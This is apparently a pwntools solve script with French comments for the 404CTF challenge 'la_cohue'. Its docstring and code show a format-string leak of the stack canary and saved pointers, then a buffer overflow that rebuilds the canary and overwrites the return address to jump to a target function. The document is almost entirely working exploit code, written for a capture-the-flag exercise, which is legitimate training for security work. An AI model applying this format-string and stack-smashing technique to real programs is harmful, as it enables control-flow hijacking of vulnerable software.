#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
$ ./la_cohue
Que faites-vous ?

1 : Aller voir Francis
2 : Réfléchir à un moyen de capturer le canari
3 : Vaquer à vos occupations
>>> 2
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
[Vous] : AAAA 25373c60 0 0 9 9 0 66a0 41414141 25207825 20782520 78252078 25207825 20782520 78252078 25207825 400790 33527c00 25376380 400b06
Que faites-vous ?

1 : Aller voir Francis
2 : Réfléchir à un moyen de capturer le canari
3 : Vaquer à vos occupations
>>> 


Que faites-vous ?

1 : Aller voir Francis
2 : Réfléchir à un moyen de capturer le canari
3 : Vaquer à vos occupations
>>> 2
%17$p.%18$p.%19$p
[Vous] : 0xa1e9153a16820400.0x7fff94447190.0x400b06
'''

from pwn import *

exe = ELF('./la_cohue')

host, port = "challenges.404ctf.fr", "30223"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)


print(f'#----------------------------------------------------------------')
print(f'# Etape 1 : choix 2 > Réfléchir à un moyen de capturer le canari ')
print(f'#----------------------------------------------------------------')
# Réfléchir à un moyen de capturer le canari
affichage = p.sendlineafter(b'>>> ', '2'.encode())
print(affichage.decode())
print()

# Récupérer des éléments 17, 18 et 19 de la stack
# 17 = protection canary
# 19 = return address de la fonction choice qu'on veut modifier
message2 = b'%17$p.%18$p.%19$p'
print(f'message envoyé : {message2}')
p.sendline(message2)
data_raw = p.recvline().decode().strip()
print(f'message récupéré : {data_raw}')
pointers = data_raw.split(':')[1].strip().split('.')
print(f'{pointers=}')


print()
print(f'#----------------------------------------------------------------')
print(f'# Etape 2 : choix 1 > Aller voir Francis ')
print(f'#----------------------------------------------------------------')
# Aller voir Francis
affichage = p.sendlineafter(b'>>> ', '1'.encode())
print(affichage.decode())
print()

# On réécrit jusqu'à l'adresse de retour de la fonction, en ciblant la fonction canary
adresse_fonction_canary = 0x00400877
message1 = b'A' * 72 + p64(eval(pointers[0])) + p64(eval(pointers[1])) + p64(adresse_fonction_canary)
print(f'message envoyé : {message1}')
affichage = p.sendlineafter(b'[Vous] : ', message1)
print(affichage.decode())

print()
print(f'#----------------------------------------------------------------')
print(f'# Etape 3 : choix 3 > Vaquer à vos occupations ')
print(f'#----------------------------------------------------------------')

affichage = p.sendlineafter(b'>>> ', '3'.encode())
print(affichage.decode())
print(p.recvall().decode().strip())


# Fermeture de la connexion
p.close()
